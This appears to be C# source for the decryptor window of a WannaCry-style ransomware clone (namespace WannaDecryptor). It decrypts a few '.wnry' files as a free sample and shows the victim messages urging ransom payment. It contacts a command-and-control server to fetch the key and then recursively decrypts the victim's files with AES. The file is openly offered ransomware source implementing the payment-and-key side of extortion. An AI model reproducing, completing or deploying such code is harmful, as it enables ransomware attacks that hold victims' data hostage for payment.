using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace WannaDecryptor
{
    /// <summary>
    /// Decrypt.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class Decrypt : Window
    {
        private List<LogVDATA> decrypt_path = new List<LogVDATA>();
        private string server_ip = "";
        private int server_port = 0;
        private string server_command = "";
        private List<string> free_decrypt_list = new List<string>();
        private string free_decrypt_key = "";
        private bool free_decrypt_check = false;
        private bool check_payment = false;
        private string enc_path = "";
        public Decrypt(string ip, string port, string command, List<string> free_decrypt_list, string free_decrypt_key, bool free_decrypt_tof, bool check_payment, string enc_path)
        {
            server_ip = ip;
            server_port = int.Parse(port);
            server_command = command;
            this.free_decrypt_list = free_decrypt_list;
            this.free_decrypt_key = free_decrypt_key;
            free_decrypt_check = free_decrypt_tof;
            this.check_payment = check_payment;
            this.enc_path = enc_path;
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Thread free_decrypt_thread = new Thread(delegate ()
            {
                this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                {
                    B1.IsEnabled = false;
                    B2.IsEnabled = false;
                    B3.IsEnabled = false;
                }));
                
                if (!free_decrypt_check)
                {
                    foreach (string get_file_name in free_decrypt_list)
                    {
                        try
                        {
                            File_AES_Decrypt(get_file_name + ".wnry", get_file_name, free_decrypt_key);
                            decrypt_path.Add(new LogVDATA() { Path = get_file_name + ".wnry" });
                            if (!check_payment)
                            {
                                this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                                {
                                    LogV.ItemsSource = decrypt_path;
                                }));
                            }
                            File.Delete(get_file_name + ".wnry");
                        }
                        catch (Exception) { }
                    }
                    free_decrypt_check = true;
                }

                try
                {
                    if (check_payment)
                    {
                        string result = Client.Connection(server_ip, server_port, server_command);
                        if (!(result == null))
                        {
                            if (result.Equals("NOT_FOUND_CLIENT_ID") || result.Equals("EXCEPTION"))
                            {
                                MessageBox.Show("Connection error! Error connecting to WannaCry C&C server. Please try again later.\r\nERROR CODE = 1", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                            }
                            else
                            {
                                File.WriteAllText("DecryptKey.wncry", result);
                                Directory_All_FileName(enc_path, result);
                                this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                                {
                                    LogV.ItemsSource = decrypt_path;
                                }));
                            }
                        }
                        else
                        {
                            MessageBox.Show("Connection error! Error connecting to WannaCry C&C server. Please try again later.\r\nERROR CODE = 0", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Error);
                        }
                    }
                    else
                    {
                        MessageBox.Show("Please confirm your payment to recover the remaining files. Press the 'Check Payment' button to try.", "@WannaDecryptor@", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                }
                catch (Exception) { }

                this.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() =>
                {
                    B1.IsEnabled = true;
                    B2.IsEnabled = true;
                    B3.IsEnabled = true;
                }));
            });
            free_decrypt_thread.Start();
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            try
            {
                string a = "";
                foreach (LogVDATA s in decrypt_path)
                {
                    string n = s.Path;
                    if (a.Equals("")) a = n;
                    else a = a + "\r\n" + n;
                }
                Clipboard.SetText(a);
            }
            catch (Exception) { }
        }

        private void Directory_All_FileName(string folderName, string key)
        {
            try
            {
                System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(folderName);
                foreach (System.IO.FileInfo f in di.GetFiles())
                {
                    if (f.Extension.ToLower().CompareTo(".wnry") == 0)
                    {
                        try
                        {
                            string strInFileName = di.FullName + "\\" + f.Name;
                            File_AES_Decrypt(strInFileName, strInFileName.Substring(0, strInFileName.Length - 5), key);
                            decrypt_path.Add(new LogVDATA() { Path = strInFileName });
                            File.Delete(strInFileName);
                        }
                        catch (Exception) { }
                    }
                }

                foreach (System.IO.DirectoryInfo sd in di.GetDirectories()) Directory_All_FileName(sd.FullName, key);
            }
            catch (Exception) { }
        }

        private static void File_AES_Decrypt(string inputFile, string outputFile, string key)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(key);
            byte[] salt = new byte[32];
            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Key = Encoding.UTF8.GetBytes(key);
            AES.IV = new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 };
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CFB;
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);
            FileStream fsOut = new FileStream(outputFile, FileMode.Create);
            int read;
            byte[] buffer = new byte[1048576];
            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                    fsOut.Write(buffer, 0, read);
            }
            catch (CryptographicException) { }
            catch (Exception) { }

            try
            {
                cs.Close();
            }
            catch (Exception) { }
            finally
            {
                fsOut.Close();
                fsCrypt.Close();
            }
        }
    }
    public class LogVDATA
    {
        public string Path { get; set; }
    }
}
